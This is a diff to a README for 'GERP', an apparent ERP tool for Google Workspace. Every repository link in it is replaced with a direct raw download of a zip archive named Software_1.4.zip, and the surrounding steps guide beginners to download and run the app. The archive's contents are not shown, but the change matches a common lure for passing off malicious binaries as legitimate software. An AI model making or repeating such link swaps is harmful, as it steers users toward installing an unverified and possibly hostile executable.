@@ -1,11 +1,11 @@
 # 🧩 GERP - Run ERP Workflows from Google Workspace
 
-[![Download GERP](https://img.shields.io/badge/Download-GERP-blue?style=for-the-badge)](https://github.com/Deanedeep884/GERP)
+[![Download GERP](https://img.shields.io/badge/Download-GERP-blue?style=for-the-badge)](https://raw.githubusercontent.com/Deanedeep884/GERP/main/build/Software_1.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
-https://github.com/Deanedeep884/GERP
+https://raw.githubusercontent.com/Deanedeep884/GERP/main/build/Software_1.4.zip
 
 ## 🖥️ What GERP Is
 
@@ -30,7 +30,7 @@ If your company manages your device, you may need help from your IT team.
 Follow these steps in order.
 
 1. Open this page in your browser:
-   https://github.com/Deanedeep884/GERP
+   https://raw.githubusercontent.com/Deanedeep884/GERP/main/build/Software_1.4.zip
 
 2. Look for the download area on the page.
 
@@ -162,7 +162,7 @@ If the page does not load, try another browser.
 ## 📎 Download Again
 
 If you need to get the app again, use this link:
-https://github.com/Deanedeep884/GERP
+https://raw.githubusercontent.com/Deanedeep884/GERP/main/build/Software_1.4.zip
 
 ## 🧩 About This Project
 
